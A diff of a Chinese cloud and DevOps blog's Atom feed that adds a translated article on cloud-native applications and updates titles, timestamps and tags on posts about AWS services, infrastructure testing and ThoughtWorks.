@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
   <title>杜屹东的博客</title>
-  <subtitle>云服务解决方案架构师</subtitle>
+  <subtitle>Cloud &amp; DevOps</subtitle>
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.duyidong.com/"/>
-  <updated>2017-04-20T04:20:02.000Z</updated>
+  <updated>2017-05-04T12:19:58.000Z</updated>
   <id>https://www.duyidong.com/</id>
   
   <author>
@@ -16,11 +16,131 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>云原生应用 (Cloud Native Application)</title>
+    <link href="https://www.duyidong.com/2017/05/03/Cloud-Native/"/>
+    <id>https://www.duyidong.com/2017/05/03/Cloud-Native/</id>
+    <published>2017-05-03T03:04:03.000Z</published>
+    <updated>2017-05-04T12:19:58.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>本文翻译自Pivotal的<a href="https://pivotal.io/cloud-native" target="_blank" rel="external">Cloud Native</a>。</p>
+<h2 id="更快部署，更低风险，和业务一同扩展"><a href="#更快部署，更低风险，和业务一同扩展" class="headerlink" title="更快部署，更低风险，和业务一同扩展"></a>更快部署，更低风险，和业务一同扩展</h2><p>云原生应用程序是专为云上的应用而设计的。这些应用程序通过小型专用功能团队实现快速构建和频繁部署，提供了轻松扩展和硬件解耦的平台，让组织更敏捷，更具有弹性和云端可移植性。</p>
+<h2 id="什么是云原生应用？"><a href="#什么是云原生应用？" class="headerlink" title="什么是云原生应用？"></a>什么是云原生应用？</h2><p><strong>云原生是一种充分利用云计算优势，用于构建和部署应用的方式。</strong>在过去的十几年，云已经重新定义了几乎所有行业的竞争格局，消除了企业对IT基础设施资本投入的关注，企业也不用增加雇员去维护一个自建的数据中心。取而代之的是无限的计算存储能力，并按时按需付费。降低IT支出以为着降低了行业壁垒，使得初创公司可以很快地实践自己的想法并应用到市场。这正是为什么软件正在吞噬世界，而创业公司正在使用云原生的方式颠覆传统行业。</p>
+<p>现在的组织需要一个集成了DevOps，持续交付，微服务和容器化得平台用于构建和运维云原生应用和服务。</p>
+<p><img src="/images/Cloud_Native_With_four.png" alt=""></p>
+<ul>
+<li><strong>DevOps</strong> 是开发和运维的合作，目标是自动化软件交付和基础设施更改过程。它创造了一个文化和环境，让构建，测试和发布软件可以快速，频繁，更可靠地发生。</li>
+</ul>
+<p><img src="https://d1fto35gcfffzn.cloudfront.net/images/topics/cloudnative/infographic-devops.png" alt=""></p>
+<ul>
+<li><strong>持续交付</strong>让单个应用随时处于可发布状态，而不用等待与其他变更绑定到一次发布中，比如一个维护的窗口。持续交付使得发布编程一个频繁且平常的过程，因此组织可以以更低的风险经常交付，并从最终用户获得更快的反馈，直到部署成为业务流程和企业竞争力的重要组成部分。</li>
+</ul>
+<p><img src="https://d1fto35gcfffzn.cloudfront.net/images/topics/cloudnative/infographic-cd.png" alt=""></p>
+<ul>
+<li><strong>微服务</strong>是将应用程序开发为小型服务的集合的架构方法;每个服务实现业务功能，运行在自己的进程中并通过HTTP API进行通信。每个微服务器都可以独立于应用程序中的其他服务进行部署，升级，扩展和重新启动，通常作为自动化系统的一部分，可以在不影响终端客户的情况下频繁更新线上应用。</li>
+</ul>
+<p><img src="https://d1fto35gcfffzn.cloudfront.net/images/topics/cloudnative/infographic-microservices.png" alt=""></p>
+<ul>
+<li><strong>容器</strong>比虚拟机（VM）提供了更高的效率和更快地速度。使用操作系统（OS）级别的虚拟化，单个操作系统实例被动态划分为多个相互独立的容器，每个容器具有唯一可写的文件系统和资源配额。创建和销毁容器的低开销以及单个instance可高密度运行多个容器的特性使得容器成为部署各个微服务器的完美工具。</li>
+</ul>
+<p><img src="https://d1fto35gcfffzn.cloudfront.net/images/topics/cloudnative/infographic-containers.png" alt=""></p>
+<blockquote>
+<p>我们所学到的一件事是，如果你不能更快地把你的想法推向市场，市场必然会发生变化。到这个时候，不论你如何优化，如何管理训练你的员工，都不会有很好的成效，因为晚了。</p>
+<p style="text-align:right">– James McGlenon（美国利宝相互保险集团 执行副总裁兼首席信息官）</p>
+
+</blockquote>
+<h2 id="为什么云原生应用很重要"><a href="#为什么云原生应用很重要" class="headerlink" title="为什么云原生应用很重要"></a>为什么云原生应用很重要</h2><ul>
+<li><p><strong>云是具有竞争力的优势</strong></p>
+<p>  云原生意味着基础设施的目标将由节约成本变为驱动业务发展，在软件生命周期中，快速构建业务和快速交付以响应客户需求将会让企业具有主宰市场的优势。产品一旦上线，应用必须是一个永远在运行，且可以动态伸缩的服务。</p>
+</li>
+<li><p><strong>灵活性</strong></p>
+<p>  企业一旦构建了应用就可以在任何云上运行而不需要修改。团队可以随时将应用在不同的公有云供应商的平台和私有云平台之间迁移或分发，以此来满足业务需求和节省开销。</p>
+</li>
+<li><p><strong>让开发人员做他们擅长的</strong></p>
+<p>  团队拥抱云原生应用可以屏蔽不同云基础设施的差异，让开发者只用关心代码，集中精力在关注在交付的业务价值。由heroku提出的<a href="https://12factor.net/zh_cn/" target="_blank" rel="external">12因素应用</a>为开发人员定义了一套云上应用的开发标准，形同一份与开发人员签订的“合同”，用于确保自己的应用程序充分利用底层的云原生平台。</p>
+</li>
+<li><p><strong>运维与业务对齐</strong></p>
+<p>  基于自动化的IT运维，企业可以转变为一个精益团队，将团队的关注点与业务推动业务发展对齐。它可以避免人工失误操作带来的风险，以流程改进代替原本的日常运维工作。通过实施在各个层面的自动补丁和自动升级，消除了宕机时间，也消除了需要“运维专家”手动修复才能解决问题的痛点。</p>
+<p>  <center><strong>云原生架构：</strong>如何达到云原生</center><br>  <img src="https://d1fto35gcfffzn.cloudfront.net/images/topics/cloudnative/diagram-cloud-native-arch-01.svg" alt=""></p>
+</li>
+</ul>
+<center><strong>云原生 对比 传统企业应用</strong></center>
+
+<table>
+<thead>
+<tr>
+<th>云原生应用</th>
+<th>传统企业应用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>可预测：</strong>云原生应用复合一个通过可预测行为来最大限度发挥弹性优势的“合同”。高自动化，容器驱动的架构使用云平台驱动改变了软件交付形式。这种“合同”的一个很好的例子就是heroku的<a href="https://12factor.net/zh_cn/" target="_blank" rel="external">十二因素应用</a>。</td>
+<td><strong>不确定性：</strong>传统应用在开发方式和架构上往往不能真正发挥云服务的优势。这样的应用通常需要很长的时间来构建，一次发布很多内容，只能逐步伸缩，并常伴有许多单点故障。</td>
+</tr>
+<tr>
+<td><strong>操作系统抽象：</strong>云原生应用要求开发者使用一个平台作为基础设施，意味着应用的基础设施是经过抽象的，更易于迁移和伸缩。构建抽象平台的方法可以自己搭建也可以购买第三方服务，比如Openshift，Cloud foundry。</td>
+<td><strong>操作系统依赖：</strong>传统的应用程序架构允许开发人员在应用程序和底层操作系统，硬件，存储和后台服务之间建立紧密的依赖关系。相比于云原生应用，这种依赖会让应用的迁移和伸缩变得异常复杂和充满风险。</td>
+</tr>
+<tr>
+<td><strong>大小适合的容量：</strong>云本地应用平台可自动进行基础设施配置和配置，并根据应用的需求在部署时重新动态分配资源。构建一个云原生应用运行时的全生命周期管理，可以做到按需伸缩，提高资源利用率，编排计算资源，以及最短宕机时间的故障恢复。</td>
+<td><strong>过大容量：</strong>传统的IT设施为应用设计了专属的技术设施架构，为一个应用准备充足的基础设施资源，从而延迟应用的部署。这种设计方案通常会根据最坏情况下的容量估算，解决方案的规模往往大大超过实际需要的规模。</td>
+</tr>
+<tr>
+<td><strong>共同协作：</strong>云原生促进DevOps，人员，流程和工具的组合，从而在开发和运营之间进行密切协作，以加速和平滑将完成的应用程序代码发布到生产环境中。</td>
+<td><strong>部门孤立：</strong>传统IT在开发和运维之间有高高的部门墙，开发要跨国一堵墙来向运维交付软件，组织优先事项优先于客户价值，导致内部冲突，拖鞋和缓慢的交付让员工士气低落。</td>
+</tr>
+<tr>
+<td><strong>持续交付：</strong>IT团队的产品永远处于可发布状态。发布软件的周期保证了更短的反馈周期，并能更有效地响应客户需求。连续交付最好和其他一些实践一起使用，包括测试驱动开发和持续集成。</td>
+<td><strong>瀑布模式：</strong>IT团队定期发布，通常周期为数周至数月，尽管代码已经完成构建，且和其他部件并无依赖。客户期望的功能总是被搁浅，延期发布，企业从而丧失了竞争优势，客户，和收入。</td>
+</tr>
+<tr>
+<td><strong>独立：</strong>微服务架构将一个复杂的应用解耦为一个个小而相互独立的模块，这些小的服务由一个个小型团队开发和运维，确保频繁，独立的更新，伸缩和故障切换/重新启动，而不影响其他服务。，</td>
+<td><strong>依赖：</strong>单体架构将本原本不需要的模块绑定在一个软件包中发布，导致开发和部署过程中的敏捷性丧失。</td>
+</tr>
+<tr>
+<td><strong>自动扩容：</strong>基础设施自动扩容可以消除宕机时间和避免人为操作失误。计算机自动化不会面临任何类似的挑战，在任何规模的部署中都使用同一套部署脚本。云原生也超越了基于传统的面向虚拟化的业务流程的专用自动化。一个完全的云原生架构包括适用于团队的自动化和业务流程，而不是要求他们习惯于写自动化脚本。换句话说，自动化使得构建和启动应用变得易于管理。</td>
+<td><strong>手动扩容：</strong>人工基础设施包含了人工运维和人工管理的服务器，网络，存储配置。扩容工作因为其复杂性，debug变得很慢，而且过程中很容易出错，手工编写的自动化脚本有可能将人为错误的硬编码到基础设施中。</td>
+</tr>
+<tr>
+<td><strong>快速恢复：</strong>容器化运行时提供了一个虚拟机之上的动态，高密度的虚拟层，是理想的微服务托管方式。动态管理容器在宿主机上的编排，方便及时回滚，扩容，和重现错误。</td>
+<td><strong>缓慢恢复：</strong>基于虚拟机的基础架构对于基于微服务的应用程序来说是一个缓慢而低效的基础设施，因为单个虚拟机启动/关闭的速度很慢，甚至在部署应用程序代码之前也就带来很大的开销。</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<ul>
+<li>Refer:</li>
+<li><a href="https://pivotal.io/cloud-native" target="_blank" rel="external">https://pivotal.io/cloud-native</a></li>
+<li><a href="https://12factor.net/" target="_blank" rel="external">https://12factor.net/</a></li>
+<li><a href="https://www.duyidong.com/pdf/beyond-the-12-factor-app.pdf">https://www.duyidong.com/pdf/beyond-the-12-factor-app.pdf</a></li>
+</ul>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;本文翻译自Pivotal的&lt;a href=&quot;https://pivotal.io/cloud-native&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Cloud Native&lt;/a&gt;。&lt;/p&gt;
+&lt;h2 id=&quot;更快部署，更低风险，和业务一同扩展&quot;&gt;&lt;a
+    
+    </summary>
+    
+      <category term="Cloud" scheme="https://www.duyidong.com/categories/Cloud/"/>
+    
+    
+      <category term="Cloud Native" scheme="https://www.duyidong.com/tags/Cloud-Native/"/>
+    
+      <category term="Cloud" scheme="https://www.duyidong.com/tags/Cloud/"/>
+    
+      <category term="翻译" scheme="https://www.duyidong.com/tags/%E7%BF%BB%E8%AF%91/"/>
+    
+  </entry>
+  
+  <entry>
     <title>基础设施代码测试</title>
     <link href="https://www.duyidong.com/2017/04/13/Infrastructure-as-Code-Testing/"/>
     <id>https://www.duyidong.com/2017/04/13/Infrastructure-as-Code-Testing/</id>
     <published>2017-04-13T05:41:29.000Z</published>
-    <updated>2017-04-20T04:20:02.000Z</updated>
+    <updated>2017-05-04T12:19:52.000Z</updated>
     
     <content type="html"><![CDATA[<p>在DevOps的文化中有一个已经被广泛认可的概念叫做<a href="https://martinfowler.com/bliki/InfrastructureAsCode.html" target="_blank" rel="external">基础设施及代码</a>，意在将基础设施以配置文件的方式纳入版本管理以达到更灵活且便于管理的目的，从而更加适应基础设施频繁变更需求。</p>
 <p>虽说此举俨然已将<a href="https://www.duyidong.com/2016/05/19/CI-CD/">CI/CD</a>（持续集成和持续交付）概念应用在了基础设施代码上，然而在应用产品的<a href="https://www.duyidong.com/tags/%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%8F%91%E5%B8%83/">持续部署与发布</a>实施过程中，基础设施变更仍然是一件令人<em>胆战心惊</em>的事，原因很简单——没有<strong>反馈及时</strong>且<strong>覆盖充分</strong>的测试。</p>
@@ -151,12 +271,14 @@ def test_hosts_file(File):
     
     </summary>
     
+      <category term="DevOps" scheme="https://www.duyidong.com/categories/DevOps/"/>
+    
+    
+      <category term="基础设施即代码" scheme="https://www.duyidong.com/tags/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%8D%B3%E4%BB%A3%E7%A0%81/"/>
     
       <category term="Infrastructure as Code" scheme="https://www.duyidong.com/tags/Infrastructure-as-Code/"/>
     
       <category term="ThoughtWorks技术雷达" scheme="https://www.duyidong.com/tags/ThoughtWorks%E6%8A%80%E6%9C%AF%E9%9B%B7%E8%BE%BE/"/>
-    
-      <category term="基础设施即代码" scheme="https://www.duyidong.com/tags/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%8D%B3%E4%BB%A3%E7%A0%81/"/>
     
       <category term="持续交付" scheme="https://www.duyidong.com/tags/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98/"/>
     
@@ -167,7 +289,7 @@ def test_hosts_file(File):
     <link href="https://www.duyidong.com/2017/04/12/leave-TW/"/>
     <id>https://www.duyidong.com/2017/04/12/leave-TW/</id>
     <published>2017-04-11T16:01:40.000Z</published>
-    <updated>2017-04-12T13:16:44.000Z</updated>
+    <updated>2017-05-04T12:19:46.000Z</updated>
     
     <content type="html"><![CDATA[<p>最近在公司的离职群里出现了一个调查问卷，我觉得很有意思，引发了我对ThoughtWorks的一些思考，顺手贴在这里。</p>
 <p>另，骚窝为ThoughtWorks音译，所以从骚窝离职的人被称为离骚。</p>
@@ -561,6 +683,8 @@ feedback，开放式协作
     
     </summary>
     
+      <category term="ThoughtWorks" scheme="https://www.duyidong.com/categories/ThoughtWorks/"/>
+    
     
       <category term="ThoughtWorks" scheme="https://www.duyidong.com/tags/ThoughtWorks/"/>
     
@@ -573,7 +697,7 @@ feedback，开放式协作
     <link href="https://www.duyidong.com/2017/04/05/How-to-pass-the-aws-certification/"/>
     <id>https://www.duyidong.com/2017/04/05/How-to-pass-the-aws-certification/</id>
     <published>2017-04-05T06:48:45.000Z</published>
-    <updated>2017-04-12T13:30:57.000Z</updated>
+    <updated>2017-05-04T12:25:58.000Z</updated>
     
     <content type="html"><![CDATA[<p>上周去参加了AWS助理级架构师的考试并顺利通过，是2017年的第一个小目标也是对云服务知识的一个检验，在此分享一下考试的经过和经验。</p>
 <h1 id="什么是AWS认证"><a href="#什么是AWS认证" class="headerlink" title="什么是AWS认证"></a>什么是AWS认证</h1><p>亚马逊作为云计算领域的领头羊，在云计算领域已经有了十多年的积累，亚马逊的云计算不论是从服务还是性能在全球都是首屈一指的。近年来国内有很多创业公司依托于阿里云，微软云，Ucloud等IaaS, PaaS服务构建了许多SaaS服务，其中不乏客如云之类的成功案例，许多大型企业也将自己的基础设施往云上迁移。近两个月腾讯云和中国电信两次以0.01元中标政府云服务项目更是起到了推波助澜的作用。如此种种，可见云服务在IT届的地位已经越来越高，对于从业者的云计算知识要求也必然会越来越高。那么考取云服务界领头羊亚马逊的认证也会变得越来越有价值。<br>AWS目前仅有助理级和专家级两个级别，2017年还会加入大数据，安全，网络三个认证。<br>就目前有的认证而言，开发者(Developer)认证应该是最好考的，助理方案解决架构师(Solutions Architect)次之，助理级最难的是运维（SysOps）。要取得专家级认证必须先取得助理级认证，关系如图：</p>
@@ -628,6 +752,10 @@ feedback，开放式协作
     
     </summary>
     
+      <category term="Amazon Web Services" scheme="https://www.duyidong.com/categories/Amazon-Web-Services/"/>
+    
+    
+      <category term="学习" scheme="https://www.duyidong.com/tags/%E5%AD%A6%E4%B9%A0/"/>
     
       <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
     
@@ -640,13 +768,14 @@ feedback，开放式协作
   </entry>
   
   <entry>
-    <title>AWS well architected framework</title>
+    <title>AWS认为，什么样的架构是一个良好的架构</title>
     <link href="https://www.duyidong.com/2017/03/23/AWS-well-architected-framework/"/>
     <id>https://www.duyidong.com/2017/03/23/AWS-well-architected-framework/</id>
     <published>2017-03-23T14:01:23.000Z</published>
-    <updated>2017-04-12T13:29:31.000Z</updated>
+    <updated>2017-05-04T12:25:45.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="AWS认为，什么样的架构是一个良好的架构"><a href="#AWS认为，什么样的架构是一个良好的架构" class="headerlink" title="AWS认为，什么样的架构是一个良好的架构"></a>AWS认为，什么样的架构是一个良好的架构</h1><p>AWS Well Architected framework，其实是亚马逊的一封<a href="https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf" target="_blank" rel="external">白皮书</a>，围绕云架构设计的安全性，可靠性，负载，花销，运维（2016年11月加入）五个支柱阐述了一个良好的架构应该遵循什么样的原则，以及一些最佳实践。<br>亚马逊在云服务届处于世界领先水平，且在十多年的云架构实践中已经积累了相当的经验，该白皮书是对这些经验的一个总结和提炼。不管是对于考试，对于成为一个云架构师，还是对于单纯的学习和了解云服务，都是一份不可多得的好材料。<br>下面附上资源地址：<a href="https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf" target="_blank" rel="external">https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf</a></p>
+    <content type="html"><![CDATA[<p>AWS Well Architected framework，其实是亚马逊的一封<a href="https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf" target="_blank" rel="external">白皮书</a>，围绕云架构设计的安全性，可靠性，负载，花销，运维（2016年11月加入）五个支柱阐述了一个良好的架构应该遵循什么样的原则，以及一些最佳实践。</p>
+<p>亚马逊在云服务届处于世界领先水平，且在十多年的云架构实践中已经积累了相当的经验，该白皮书是对这些经验的一个总结和提炼。不管是对于考试，对于成为一个云架构师，还是对于单纯的学习和了解云服务，都是一份不可多得的好材料。<br>下面附上资源地址：<a href="https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf" target="_blank" rel="external">https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf</a></p>
 <h2 id="啰嗦几句"><a href="#啰嗦几句" class="headerlink" title="啰嗦几句"></a>啰嗦几句</h2><p>自从互联网诞生以来，各互联网公司通过将自己服务器的端口暴露在公共网络的方式提供服务，普通用户通过供应商接入公共网络，与公司服务器建立连接进行数据传输，从而实现“上网”的功能。对普通用户而言，终端以外的世界都是黑盒，而对于提供服务的互联网公司而言，则要运维大量的服务器，交换机等设备，为了保证服务的可靠性，容灾能力，为了开发，测试，常常需要维护超过实际提供服务的服务器数量很多倍的基础设施。又例如，在淘宝双十一期间可能由于用户访问量基层淘宝需要临时增加一倍的服务器数量来保证服务的正常运行，而在活动结束后，又需要恢复正常的服务器数量，那么这多出来的一倍服务器难免就会造成资源浪费。而且在很多时候，传统运维的背景下，申请一台服务器时间很长，手续繁琐，为了方便，研发部门通常会申请超出所需的基础设施资源，“以备不时之需”，这样的情况也会给企业造成大量的浪费。云服务，就是为了解决这种种问题而诞生的。</p>
 <p><img src="/images/Cloud_better.png" alt=""></p>
 <p>最简单的云服务模型，就是在云服务厂商集中托管了一个超级大型的服务器群，云服务厂商通过对外租赁服务器的形式代替了互联网厂商自己维护服务器的方式。这样做的好处在于一是避免了闲置基础设施资源的浪费，二是随着云服务的不断普及，以及Agile，DevOps运动的兴起，人们对IT设施的灵活度要求越来越高，这两年Infrastructure as Code（基础设施即代码）的理念已经被越来越多的厂商应用到生产实践中去，基础设施及代码的理念，和云服务是一脉相承的，租户可以更快地申请到设备，可以更灵活的对自己的设备定制化，规定大小，容量，甚至预配置一些环境，和自己的服务紧耦合，使公司的生产活动可以跟多的关注在业务上，而不用去操心服务器的性能，预估自己能承受的访问量，从而给业务发展带来更大的发展空间。这一点表现在今年AWS大力在推行的的Serverless架构上。<br>在笔者看来，云服务并不是一个技术上的创新，而更像是一种商业模式，为了让企业更灵活的适应瞬息万变的市场和用户需求，为了使社会资源更加合理化配置，同时，云服务也是信息全球化的重要一环，为人工智能，大数据奠定了基础。</p>
@@ -853,14 +982,14 @@ feedback，开放式协作
     
     <summary type="html">
     
-      &lt;h1 id=&quot;AWS认为，什么样的架构是一个良好的架构&quot;&gt;&lt;a href=&quot;#AWS认为，什么样的架构是一个良好的架构&quot; class=&quot;headerlink&quot; title=&quot;AWS认为，什么样的架构是一个良好的架构&quot;&gt;&lt;/a&gt;AWS认为，什么样的架构是一个良好的架构&lt;/h1&gt;&lt;
+      &lt;p&gt;AWS Well Architected framework，其实是亚马逊的一封&lt;a href=&quot;https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf&quot; ta
     
     </summary>
     
+      <category term="Cloud" scheme="https://www.duyidong.com/categories/Cloud/"/>
+    
     
       <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
-    
-      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
     
       <category term="Cloud Native" scheme="https://www.duyidong.com/tags/Cloud-Native/"/>
     
@@ -869,13 +998,13 @@ feedback，开放式协作
   </entry>
   
   <entry>
-    <title>Enable HTTPS and CDN with Cloudfront</title>
+    <title>使用AWS解锁HTTPS和CDN</title>
     <link href="https://www.duyidong.com/2017/03/20/Enable-HTTPS-and-CDN-with-Cloudfront/"/>
     <id>https://www.duyidong.com/2017/03/20/Enable-HTTPS-and-CDN-with-Cloudfront/</id>
     <published>2017-03-20T12:23:37.000Z</published>
-    <updated>2017-04-12T13:28:34.000Z</updated>
+    <updated>2017-05-04T12:25:32.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="使用AWS解锁HTTPS和CDN"><a href="#使用AWS解锁HTTPS和CDN" class="headerlink" title="使用AWS解锁HTTPS和CDN"></a>使用AWS解锁HTTPS和CDN</h1><p>在上一篇博客中，笔者已经介绍了<a href="https://www.duyidong.com/2017/03/07/Deploy-Hexo-to-S3/">将hexo博客发布到S3</a>，这一部分我将介绍如何使用AWS的Route53应用上自己的域名，以及如何使用Cloudfront开启HTTPS/HTTP2和CDN加速。</p>
+    <content type="html"><![CDATA[<p>在上一篇博客中，笔者已经介绍了<a href="https://www.duyidong.com/2017/03/07/Deploy-Hexo-to-S3/">将hexo博客发布到S3</a>，这一部分我将介绍如何使用AWS的Route53应用上自己的域名，以及如何使用Cloudfront开启HTTPS/HTTP2和CDN加速。</p>
 <h2 id="关于Route53"><a href="#关于Route53" class="headerlink" title="关于Route53"></a>关于Route53</h2><p>Route53是AWS提供的DNS服务，提供常见域名服务，用户可以使用Route53注册使用域名，指向自己的服务，可以除了一般域名服务都支持的A类地址（直接指向IP），及CNAME（指向另一个域名）以外，Route53还支持一个功能叫做A-record，即可以将DNS指向AWS内部的资源，该服务功能与CNAME基本相同，但是免费。此外，Route53支持以下几种路由策略：</p>
 <ul>
 <li><strong>Simple Routing Policy</strong>：通常在只有一个资源的时候使用这种策略，该种策略会自由（平均）分配负载给所属资源</li>
@@ -941,9 +1070,11 @@ feedback，开放式协作
     
     <summary type="html">
     
-      &lt;h1 id=&quot;使用AWS解锁HTTPS和CDN&quot;&gt;&lt;a href=&quot;#使用AWS解锁HTTPS和CDN&quot; class=&quot;headerlink&quot; title=&quot;使用AWS解锁HTTPS和CDN&quot;&gt;&lt;/a&gt;使用AWS解锁HTTPS和CDN&lt;/h1&gt;&lt;p&gt;在上一篇博客中，笔者已经介绍
+      &lt;p&gt;在上一篇博客中，笔者已经介绍了&lt;a href=&quot;https://www.duyidong.com/2017/03/07/Deploy-Hexo-to-S3/&quot;&gt;将hexo博客发布到S3&lt;/a&gt;，这一部分我将介绍如何使用AWS的Route53应用上自己的域名，以及如何使用Cl
     
     </summary>
+    
+      <category term="我的博客" scheme="https://www.duyidong.com/categories/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
     
     
       <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
@@ -963,13 +1094,14 @@ feedback，开放式协作
   </entry>
   
   <entry>
-    <title>AWS云上虚拟机</title>
+    <title>AWS虚拟机EC2</title>
     <link href="https://www.duyidong.com/2017/03/15/AWS-EC2/"/>
     <id>https://www.duyidong.com/2017/03/15/AWS-EC2/</id>
     <published>2017-03-15T12:02:03.000Z</published>
-    <updated>2017-04-12T13:29:23.000Z</updated>
+    <updated>2017-05-04T12:18:08.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="AWS虚拟机EC2"><a href="#AWS虚拟机EC2" class="headerlink" title="AWS虚拟机EC2"></a>AWS虚拟机EC2</h1><p>Amazon Elastic Cloud Compute，简单来说就是亚马逊的虚拟机。<br>亚马逊的EC2标榜有几大优势：完全控制，灵活使用，方便集成，安全，便宜，简单好用。<br>关于EC2有几个重要的概念：Instance Type，即在选择Instance的时候的内存，CUP等硬件指标；然后是EBS，即挂载硬盘，租户可以选择不同IO，不同介质的虚拟硬盘；其次是AMI，即用于启动虚拟机的操作系统镜像；另外还有Security Group，可以理解为虚拟机的防火墙；其他的服务都属于附加服务，比如负载均衡，弹性伸缩，监控报警，权限控制，类似nfs的弹性存储介质等等。<br>虚拟机服务是云服务最重要的服务，几乎各大云厂商最终要的一项都是对租户提供虚拟机，看大厂的虚拟机策略，其他各厂基本可通晓一二。<br>由于企业级应用很少用windows的使用场景，笔者将主要关注在Linux的使用上，本文对windows使用场景改不涉及。</p>
+    <content type="html"><![CDATA[<p>Amazon Elastic Cloud Compute，简单来说就是亚马逊的虚拟机服务，用户可以使用EC2服务创建一个个实例(instances)，即虚拟机。</p>
+<p>亚马逊的EC2标榜有几大优势：完全控制，灵活使用，方便集成，安全，便宜，简单好用。<br>关于EC2有几个重要的概念：Instance Type，即在选择Instance的时候的内存，CUP等硬件指标；然后是EBS，即挂载硬盘，租户可以选择不同IO，不同介质的虚拟硬盘；其次是AMI，即用于启动虚拟机的操作系统镜像；另外还有Security Group，可以理解为虚拟机的防火墙；其他的服务都属于附加服务，比如负载均衡，弹性伸缩，监控报警，权限控制，类似nfs的弹性存储介质等等。<br>虚拟机服务是云服务最重要的服务，几乎各大云厂商最终要的一项都是对租户提供虚拟机，看大厂的虚拟机策略，其他各厂基本可通晓一二。<br>由于企业级应用很少用windows的使用场景，笔者将主要关注在Linux的使用上，本文对windows使用场景改不涉及。</p>
 <h2 id="Instances"><a href="#Instances" class="headerlink" title="Instances"></a>Instances</h2><p>EC2为亚马逊的服务，Instance就是该服务提供的一个实例 —— 虚拟机</p>
 <h3 id="Instance-Purchasing-Options"><a href="#Instance-Purchasing-Options" class="headerlink" title="Instance Purchasing Options"></a>Instance Purchasing Options</h3><p>在说Instance Type之前，有个更重要的东西：Instance的收费方式（Instance Purchasing Options）。Instance有四种收费方式，针对不同应用场景要学会选择适合的Purchasing Option:</p>
 <ul>
@@ -1076,18 +1208,19 @@ feedback，开放式协作
     
     <summary type="html">
     
-      &lt;h1 id=&quot;AWS虚拟机EC2&quot;&gt;&lt;a href=&quot;#AWS虚拟机EC2&quot; class=&quot;headerlink&quot; title=&quot;AWS虚拟机EC2&quot;&gt;&lt;/a&gt;AWS虚拟机EC2&lt;/h1&gt;&lt;p&gt;Amazon Elastic Cloud Compute，简单来说就是亚马逊的虚拟机
+      &lt;p&gt;Amazon Elastic Cloud Compute，简单来说就是亚马逊的虚拟机服务，用户可以使用EC2服务创建一个个实例(instances)，即虚拟机。&lt;/p&gt;
+&lt;p&gt;亚马逊的EC2标榜有几大优势：完全控制，灵活使用，方便集成，安全，便宜，简单好用。&lt;br&gt;关于EC
     
     </summary>
+    
+      <category term="Amazon Web Services" scheme="https://www.duyidong.com/categories/Amazon-Web-Services/"/>
     
     
       <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
     
-      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
+      <category term="云计算" scheme="https://www.duyidong.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
     
       <category term="EC2" scheme="https://www.duyidong.com/tags/EC2/"/>
-    
-      <category term="云计算资源" scheme="https://www.duyidong.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97%E8%B5%84%E6%BA%90/"/>
     
   </entry>
   
@@ -1096,9 +1229,10 @@ feedback，开放式协作
     <link href="https://www.duyidong.com/2017/03/13/AWS-S3/"/>
     <id>https://www.duyidong.com/2017/03/13/AWS-S3/</id>
     <published>2017-03-13T01:45:12.000Z</published>
-    <updated>2017-04-12T13:28:09.000Z</updated>
+    <updated>2017-05-04T12:16:48.000Z</updated>
     
-    <content type="html"><![CDATA[<p>AWS S3是一个非常厉害的服务，上个月S3宕机4小时，江湖上传出了“半个互联网出现问题”的传言。姑且不谈S3的影响力有多大，在计算单元越来越小且移动存储设备近两年并未降价的趋势下，高可用高伸缩的云存储服务应该成为每一个开发者必备的知识。<br>简单来说S3提供了一些bucket，租户可以在其中存放一些对象，何为对象？所有静态文件都属于镜像。<br>关于S3的高持久和高可用：</p>
+    <content type="html"><![CDATA[<p>AWS S3是一个非常厉害的服务，上个月S3宕机4小时，江湖上传出了“半个互联网出现问题”的传言。姑且不谈S3的影响力有多大，在计算单元越来越小且移动存储设备近两年并未降价的趋势下，高可用高伸缩的云存储服务应该成为每一个开发者必备的知识。</p>
+<p>简单来说S3提供了一些bucket，租户可以在其中存放一些对象，何为对象？所有静态文件都属于镜像。<br>关于S3的高持久和高可用：</p>
 <p><img src="/images/Table_S3.png" alt=""></p>
 <h2 id="S3有几个重要的特点"><a href="#S3有几个重要的特点" class="headerlink" title="S3有几个重要的特点"></a>S3有几个重要的特点</h2><ul>
 <li><strong>Sunolicity:</strong>简单，S3服务可以使用AWS console控制，可以使用命令行，可以通过各种语言的sdk与各应用深度集成。</li>
